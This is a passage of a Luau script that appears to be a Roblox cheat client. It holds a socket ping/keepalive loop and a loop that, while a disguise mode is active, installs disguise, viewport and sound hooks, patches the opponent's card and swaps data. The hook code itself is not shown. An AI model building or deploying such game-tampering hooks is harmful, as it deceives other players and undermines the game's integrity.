            if lastPongAt > 0 and now - lastPongAt > PONG_TIMEOUT then
                socketDead(s)
            elseif now - lastPingAt >= APP_PING_INTERVAL then
                lastPingAt = now
                local ok = pcall(function() s:Send("xeno:ping:v1") end)
                if not ok then socketDead(s) end
            end
        end
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        if kicked then break end
        if Disguise.on and Disguise.key then
            if not Disguise.hooked then pcall(installDisguiseHook) end
            if not Disguise.viewHooked then pcall(installViewportHook) end
            if not Disguise.soundHooked then pcall(installSoundHook) end
            pcall(retarget)
            pcall(patchOpponentCardNow)
            if Disguise.target and not Disguise.saved then pcall(applyDataSwap) end
        end
    end
end)

task.wait(3)
pcall(installSoundHook)
task.wait(5)
pcall(installSoundHook)
task.wait(10)
pcall(installSoundHook)
